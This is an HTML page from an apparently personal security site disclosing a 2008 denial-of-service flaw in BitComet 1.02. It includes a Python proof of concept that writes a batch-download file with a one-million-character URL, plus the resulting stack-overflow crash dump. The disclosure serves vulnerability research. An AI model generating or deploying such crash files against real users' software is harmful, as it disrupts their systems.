@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="Shinnok at localhost."/>
+<meta name="keywords" content="shinnok, exploits, vulnerabilities, buffer overflow, cyber-security, unix, linux, open-source, c++, Qt, programming, cross-platform"/>
+<meta name="author" content="Shinnok"/>
+<link rel="icon" href="/img/shinnok.png" type="image/png" />
+<link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon" />
+<link rel="stylesheet" type="text/css" href="/style.css"/>
+<title>Shinnok @127.0.0.1</title>
+</head>
+
+<body>
+<div class="main">
+<div id="header">
+        <div id="gfx">
+            <div id="hexdump">
+                <script>
+                 var p=0,q=-12;function a(){if(window.setTimeout&&document.getElementsByTagName){var o=(2<<6);var b=document.getElementsByTagName("pre")[0];b.style.top=(p-o)+"pt";var l=document.getElementsByTagName("b");var o=-(p-o)+"pt";for(var a in l){if(l[a].style)l[a].style.top=o;}p+=q;if(p<-2<<9||p>=0)q=-q;window.setTimeout(this.a,2<<8);}};
+
+                var xhr = new XMLHttpRequest();
+                xhr.onreadystatechange = function() {
+                  if (xhr.readyState === 4 && xhr.status === 200) {
+                    document.getElementById("hexdump").innerHTML = xhr.responseText;
+                    a();
+                  }
+                };
+                xhr.open("GET", "/hexdump.html", true);
+                xhr.send();
+                </script>
+            </div>
+
+            <div id="logo"><h1><a href="#">Shinnok @127.0.0.1</a></h1></div>
+            <div class="quote" id="head-quote"><h4><a href="/">When in doubt, use brute force</a></h4></div>
+        </div>
+        <div class="menu">
+                <a href="/"><center><span>Home</span></center></a>
+                <a href="/rants/"><center><span>Rants</span></center></a>
+                <a href="/vulns/"><center><span>Vulns/Exploits</span></center></a>
+                <a href="/projects/"><center><span>Projects</span></center></a>
+                <a href="/stuff/"><center><span>Stuff</span></center></a>
+                <a href="/about/" id="last"><center><span>About</span></center></a>
+        </div>
+</div> <!--header-->
+
+<div class="content">
+
+<div class="item">
+    <h1>[2008-07-16] BitComet URI Handling Denial of Service Vulnerability</h1>
+</div>
+<div class="item">
+    <h1>Description</h1>
+    <p>BitComment is prone to a denial-of-service vulnerability when trying to handle a malicious crafted file.The vulnerability resides in failure to handle overly long urls in the file provided for batch download./p>
+</div>
+<div class="item">
+    <h1>POC/Exploit code&nbsp;&nbsp;&nbsp;<a href="/vulns_code/bitcomet.py">[.py]</a></h1>
+     <code>
+#!/usr/bin/python
+# BitComet 1.02 [HTTP/FTP Batch Download] url DOS
+#This python script will generate an evil_batch.txt file that when
+#loaded into bitcomet for batch downloading it will result in a crash.
+#The vulnerability resides in failure to handle overly long urls.
+#(File-&gt;HTTP/FTP Batch Download-&gt;Import URL from file-&gt;OK)
+#Debug output:
+#              ----------------------------------------------------------------
+#              Exception C00000FD (STACK_OVERFLOW)
+#              ----------------------------------------------------------------
+#              EAX=00032000: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00
+#              EBX=06E90020: 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00
+#              ECX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+#              EDX=7C90EB94: C3 8D A4 24 00 00 00 00-8D 64 24 00 90 90 90 90
+#              ESP=0012B354: 66 9A 80 7C 5C 85 57 00-5C F9 B1 00 00 F0 5F 01
+#              EBP=0012B380: 04 B4 12 00 83 8B 57 00-20 00 E9 06 50 00 00 00
+#              ESI=015FF000: 14 CB 99 00 E4 05 00 00-06 00 00 00 3F 00 00 00
+#              EDI=001E8482: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00
+#              EIP=00707E07: 85 00 EB E9 55 8B EC 51-53 56 8B F0 33 DB 3B F3
+#                            --&gt; TEST [EAX],EAX
+#              ----------------------------------------------------------------
+#
+#
+#Found by Shinnok
+batch = 'http://'
+badstr = 'A' * 1000000
+batch += badstr
+
+f = open('evil_batch.txt','wb')
+f.write(batch);
+f.close
+    </code>
+</div>
+<div class="item">
+    <h1>Other references</h1>
+        <p>Milw0rm : n/a</p>
+        <p>Securityfocus : <a href="http://www.securityfocus.com/bid/30255/">http://www.securityfocus.com/bid/30255/</a></p>
+</div>
+
+
+</div>
+
+<div class="footer">&copy; copycats 1970 <a href="#">↥</a></div>
+</div> <!--main-->
+</body>
+</html>
+
